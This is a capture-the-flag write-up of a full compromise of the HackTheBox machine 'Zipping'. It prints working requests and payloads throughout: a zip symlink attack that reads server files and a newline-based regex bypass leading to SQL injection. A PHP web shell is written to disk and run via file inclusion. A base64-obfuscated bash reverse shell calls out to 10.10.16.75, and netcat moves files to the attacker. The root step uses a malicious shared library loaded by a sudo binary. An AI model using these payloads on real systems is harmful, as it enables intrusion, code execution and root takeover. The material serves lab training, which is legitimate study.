# NMAP 

```bash
[sudo] password for angelo: 
Sorry, try again.
[sudo] password for angelo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-09 12:09 CET
Nmap scan report for 10.10.11.229
Host is up (0.82s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp   open  http
|_http-title: Zipping | Watch store
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 14.86 seconds
```


# USER 

Starting with some enumeration on main site

` gobuster dir -u http://10.10.11.229 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

```
/uploads              (Status: 301) [Size: 314] [--> http://10.10.11.229/uploads/]
/shop                 (Status: 301) [Size: 311] [--> http://10.10.11.229/shop/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.229/assets/]
```

We found a subfolder with a shop which allow to buy some products

http://10.10.11.229/shop/

The main page seems to suffer from `LFI` by injecting the page parameter found from normal requests.
Page should not contain the extensions, it seems to be appended already to the input string.

So let's find somegthing useful by filtering with response size. We filter with response size because if the page we're trying to reach do not exists, the index page is returned to the user.

`ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.10.11.229/shop/index.php?page=FUZZ' -fs 2615`


```
products                [Status: 200, Size: 2584, Words: 825, Lines: 68, Duration: 153ms]
product                 [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 143ms]
index                   [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 3134ms]
cart                    [Status: 200, Size: 2033, Words: 670, Lines: 64, Duration: 102ms]
functions               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 109ms]
```

Uhmm functions seems to be interesting but calling it do not produce useful information.

After some other injections on shop folder i found nothing useful, so i enumerated the main site again adding some extensions.

Upload.php seems to be very interesting.

`gobuster dir -u http://10.10.11.229/ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt`

```
/uploads              (Status: 301) [Size: 314] [--> http://10.10.11.229/uploads/]
/shop                 (Status: 301) [Size: 311] [--> http://10.10.11.229/shop/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.229/assets/]
/upload.php           (Status: 200) [Size: 5322]
```

The following payload from the shop `GET /shop/index.php?page=../../html/upload HTTP/1.1` is valid and sites resides in  `/var/www/html`.

The upload page accepts only a zip file. In particular the zip file can contains only pdfs, and only one file!
Once uploaded the zip, the link to visualize the pdf inside the zip is shown.

Here there was an intented when the challenge got released and was to create a file inside the zip with a name containing a nullbytes, this would have let to save a php file on remote server (something like this `test.php%00.pdf`)

It does not work anymore, but we can reach `LFI` here by using the zip slip attack:

`ln -s ../../../../../../../../../../etc/passwd file.pdf`

`zip --symlinks poc.zip file.pdf`

but rending the uploaded file from browser

`Error Failed to load PDF document`

and with curl `curl http://10.10.11.229/uploads/d73f158f554250e5ef60c5518940036c/file.pdf`

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false

```

It worked!
So the difference between the first `LFI` and the second is that the second leads us to read arbitary files on server while the first lfi in the shop allows as only to inlcude different `php` scripts which must already exists remotely.

we can read `/home/rektsu/user.txt`, but it's useless, we must btain a shell first.

Since we enumerated some `php` files, let's try to read the source code of the,

Let's start from the `upload.php`

```bash
ln -s ../../../../../../../../../../var/www/html/upload.php file.pdf
zip --symlinks poc.zip file.pdf
curl http://10.10.11.229/uploads/1e5a8fe15a778c7fe734485c474d63df/file.pdf
```

```php
            <?php                                                                                         
            if(isset($_POST['submit'])) {
              // Get the uploaded zip file
              $zipFile = $_FILES['zipFile']['tmp_name'];
              if ($_FILES["zipFile"]["size"] > 300000) {                                                  
                echo "<p>File size must be less than 300,000 bytes.</p>";
              } else {                                                                                    
                // Create an md5 hash of the zip file 
                $fileHash = md5_file($zipFile);
                // Create a new directory for the extracted files                                                                                                                                                   
                $uploadDir = "uploads/$fileHash/";                                                        
                $tmpDir = sys_get_temp_dir();                                                                                                                                                                       
                // Extract the files from the zip
                $zip = new ZipArchive;
                if ($zip->open($zipFile) === true) {
                  if ($zip->count() > 1) {
                  echo '<p>Please include a single PDF file in the archive.<p>';                                                                                                                                    
                  } else {
                  // Get the name of the compressed file
                  $fileName = $zip->getNameIndex(0);
                  if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
                    $uploadPath = $tmpDir.'/'.$uploadDir;
                    echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
                    if (file_exists($uploadPath.$fileName)) {
                      mkdir($uploadDir);
                      rename($uploadPath.$fileName, $uploadDir.$fileName);
                    }
                    echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a hr
ef="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
                  } else {
                    echo "<p>The unzipped file must have  a .pdf extension.</p>";
                  }
                 }
                } else {
                  echo "Error uploading file.";
                }

              }
            }
            ?>
```

but we don't have control over inputs of this script, it seems a dead endline.

Let's continue to enumerate source codes and save them into `assets` local directory.

I created a script also called `lfi_exploiter.py` to help me to create `zip` files quicker.


```bash
ln -s ../../../../../../../../../../var/www/html/shop/functions.php file.pdf
zip --symlinks poc.zip file.pdf
curl http://10.10.11.229/uploads/239cdfaa2a04b380a22f74889e0c787e/file.pdf
```

Functions has username and password for db, but we cannot access and it seems pretty useless.
But from functions files we notice that db is `mysql`.

Let's take a look at `cart.php` file then:


```php
<?php
// If the user clicked the add to cart button on the product page we can check for the form data
if (isset($_POST['product_id'], $_POST['quantity'])) {
    // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
        echo '';
    } else {
        // Construct the SQL statement with a vulnerable parameter
        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'"; // can we use union select to inject a product with some useful properties?
        // Execute the SQL statement without any sanitization or parameter binding
        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if ($product && $quantity > 0) {
          
            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
                if (array_key_exists($product_id, $_SESSION['cart'])) {
                    // Product exists in cart so just update the quanity
                    $_SESSION['cart'][$product_id] += $quantity;
                } else {
                    // Product is not in cart so add it
                    $_SESSION['cart'][$product_id] = $quantity;
                }
            } else {
                // There are no products in cart, this will add the first product to cart
                $_SESSION['cart'] = array($product_id => $quantity);
            }
        }
        // Prevent form resubmission...
        header('location: index.php?page=cart');
        exit;
    }
}

....
```

Uhmmm, `$product_id` and `$quantity` are guarded from regexes. But `$_POST['product_id']` is embedded directly in the query without using prepare statements. If the regex is bypassed this could lead to `SQLI`.

Let's analyze `product_id` regex

```
^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$
```

The regex filters for any char except for numbers. Actually it cheks if the string ends with a number and it ensure that before the latest digits there aren't any other alphanumeric characters. So it should ensure that only numbers should be accepted.
The problem is that the operator `.*` used, do not match for lines terminators. This is a common problem in regexes which affects every language and so with the help of `regex101.com` you can check that doing a newline and inserting a payload wich ends with a number, bypasses the regex.

```

test1
```

We can effectively check for the sql injection with something like this

```http
POST /shop/index.php?page=cart HTTP/1.1
Host: 10.10.11.229
Content-Length: 74
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.229
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.229/shop/index.php?page=product&id=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=im3krcd3emfm96hir41b6tmb1d
Connection: close

quantity=1&product_id=%0D%0A'/**/or/**/(select/**/sleep(3))/**/and+1=1--+1
```

The server sleeps a random time actually, but the sql injection is quite confirmed anyway. I think this was intented by htb servers to prevent the excessive use of automatic scanners for finding vulnerabilities. Comments between instructions are not actually needed. The only way this can be exploited is using `time based` payloads, but the server seems to overcompicate this and sleeps a random time when sleep statemet is used. Let's try anyway to enumerate something with `sqlmap`. From burpsuite save `request.txt` inserting a custom placeholder:


```
POST /shop/index.php?page=cart HTTP/1.1
Host: 10.10.11.229
Content-Length: 33
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.229
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.229/shop/index.php?page=product&id=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=im3krcd3emfm96hir41b6tmb1d
Connection: close

quantity=1&product_id=%0D%0A*--+1
```

`sqlmap -r '/home/angelo/HTB/ZIPPING/request.txt' --random-agent --tampers=space2comment --dbs --time-sec=10`

It took a long time and I was not even able to enumerate everything. It seems useless without even proceeding

```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] zipping

Database: zipping
[1 table]
+----------+
| products |
+----------+

[8 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| desc       | text         |
| name       | varchar(200) |
| date_added | datetime     |
| id         | int(11)      |
| img        | text         |
| price      | decimal(7,2) |
| quantity   | int(11)      |
| rrp        | decimal(7,2) |
+------------+--------------+
```

Then I tried the tehnique to crate a file using sql injection. This can be usful because `index.php` precedently enumerated has a `lfi` (the first that we already discovered) and the code is this

```php
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>

```

We could exploit inlcude to include a php file. Let's try to exploit `SQL injection` to crate a file first.

IN mysql there are some funcitons to save queries to files. We can use `select ... into outfile ''` or `select ... into dumpfile ''`. From the sql injection page: if the query is succesfully executed we get a `302` page otherwise `500` is returned.

Trying the following request:

```
POST /shop/index.php?page=cart HTTP/1.1
Host: 10.10.11.229
Content-Length: 170
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.229
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.229/shop/index.php?page=product&id=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=r3hu0209v6difsj74b5lrcujg7
Connection: close

quantity=1&product_id=%0D%0A'+union+select+1,2,3,4,5,6,7,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E')+into+outfile+'/tmp/test.php'--+1
```

Leads to a 302 response. So it worked! The file has been created. But you should notice that using dumpfile in mysql, is not enabled by default, so this part is a little bit guessy in my opinion. Which is `unhexed` is a simple php shell `<?php system($_GET['cmd']); ?>`. 

Now we can excute the coe through the `lfi`

```
GET /shop/index.php?cmd=whoami&page=../../../../../../../tmp/test HTTP/1.1
Host: 10.10.11.229
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

For some reason we get the index page instead of our writed php file.
I lost some time here to understand, but the reason is simple. `mysql` is exeuted with privileges different from `www-data` or `rektsu`. So even if we can read or write a directory through sql injection this do not mean that we can read the created file from php applicaiton. I tried also to save the file in `/var/www/html/uplaods/UPLOADHASH` or  `/var/www/html/uplaods/` but when running the sql injection i got 500 internal server error. After some time, I found a path that we can read/write from the 2 different users. The directory writeable is the default `mysql` directory. We can understan where to find it since in response headers we have operating system used from the server, which is ubuntu.

Let's try to obtain a shell finally

```
POST /shop/index.php?page=cart HTTP/1.1
Host: 10.10.11.229
Content-Length: 170
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.229
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.229/shop/index.php?page=product&id=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=r3hu0209v6difsj74b5lrcujg7
Connection: close

quantity=1&product_id=%0D%0A'+union+select+1,2,3,4,5,6,7,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E')+into+outfile+'/var/lib/mysql/test2.php'--+1
```

 when the statement is succesfull and the file gets created we get a `302 status code` otherwise a `500 internal server error`, if it already exists.

```
GET /shop/index.php?cmd=whoami&page=../../../../../../../var/lib/mysql/test2 HTTP/1.1
Host: 10.10.11.229
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

It works!

shell:

`echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNzUvMTIzNCAwPiYxICAK' | base64 -d | bash`

the sqli injection is executed under user `mysql`, that's the reason why we can't write in `/var/www/html` while lfi is executed as user `rektsu`.

`whoami -> rektsu`

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```

We're `rektsu` and we can obtain `user.txt`

# ROOT

Enumeration with `lse.sh` or `sudo -l`.

```
Matching Defaults entries for rektsu on zipping:                                                          
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
                                                                                                          
User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

we have a binary, we can download it using netcat.

```bash
receive file: nc -l -p 12344 > stock
send file: nc 10.10.16.75 12344 < /usr/bin/stock
```

Or you can use `scp` after saving a public ssh key under `.ssh` directory in user inside `authorized_keys` file. 

Running the binary it asks for a password.
Let's try to decompile it with `ghidra`

```c
bVar1 = checkAuth(password_buffer);


bool checkAuth(char *param_1)

{
  int iVar1;
  
  iVar1 = strcmp(param_1,"St0ckM4nager");
  return iVar1 == 0;
}

```

ghidra shows the password since its saved in a variable

```
password: St0ckM4nager
```

A menu manager is shown and we can see and modify a stock file from root directory

```

Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 1
```

Readed/writed file is

```
file = "/root/.stock.csv";
```

There are no buffer overflows and inputs seems to be safely guarded. No buffer exceed is present inside the code.

At a certain point I noticed the presence of something strange. In particular the following operation are present after inserting stock password:


```c
    local_e8 = 0x2d17550c0c040967;
    local_e0 = 0xe2b4b551c121f0a;
    local_d8 = 0x908244a1d000705;
    local_d0 = 0x4f19043c0b0f0602;
    local_c8 = 0x151a;
    local_f0 = 0x657a69616b6148;
    XOR((long)&local_e8,0x22,(long)&local_f0,8);
    local_28 = dlopen(&local_e8,1);
```

I read what the function `dlopen` does and from the documentation


```
       The function dlopen() loads the dynamic shared object (shared
       library)  file  named  by the null-terminated string filename
       and returns an opaque "handle" for the loaded  object.   This
       handle  is  employed  with other functions in the dlopen API,
       such as dlsym(3), dladdr(3), dlinfo(3), and dlclose().
```

So the function accepts a string which is the filename and loads it dinamically as an external library.

I then read about shared library misconfiguration and I came to this useful link https://tbhaxor.com/exploiting-shared-library-misconfigurations/

The problem is that in one or another way, as shown in the link, the user must be able to notice what library is trying to load the binary and following the same steps using `ldd` etc on the binary did not show anything in our case.

So the library is dinamically loaded with `dlopen` and there is no way to get the name of the library.
At least not statically like that.

In fact, as shown above from ghidra, we have some hexed strings which are `XORED`. This is useful to hide statically the path of the library loaded. In fact the XOR funtion is the following:

```c
void XOR(long param_1,ulong param_2,long param_3,long param_4)

{
  int local_10;
  int local_c;
  
  local_c = 0;
  for (local_10 = 0; (ulong)(long)local_10 < param_2; local_10 = local_10 + 1) {
    if ((long)local_c == param_4 + -1) {
      local_c = 0;
    }
    *(byte *)(param_1 + local_10) = *(byte *)(param_1 + local_10) ^ *(byte *)(param_3 + local_c);
    local_c = local_c + 1;
  }
  return;
}
```

The functions attempts to iterate from a region of a memory to the same ragion of memory + 0x22, and it xors the content in those region of memory. I tried to reverse the function but I'm not a big fan of `c` language, so I was not able to obtain the filname of the lirbary running the function. Yeah since you have a xor, most probably to obtain the filename library what you have to do is only run the function with the same inputs and obtain what you want as output. But obtained results did not brough me in the right way.

After a lot of attempts I remembered that debugging programs like `strace` or `ltrace` could have helped me in this situation.

In fact running `strace ./stock` (in local o remotely do not care), and after inserting the password we obtain an important info

```
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

Yes! The binary tries to load a library from the following path `/home/rektsu/.config/libcounter.so`

At this point using the first method from the link https://tbhaxor.com/exploiting-shared-library-misconfigurations/, I created an exploit c file called `exploit.c`


```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

Then, you compile it with the following command

```bash
gcc -shared -fPIC -nostartfiles -o /home/rektsu/.config/libcounter.so exploit.c
```

running

```bash
sudo /usr/bin/stock
```

you obtain a shell with root privileges.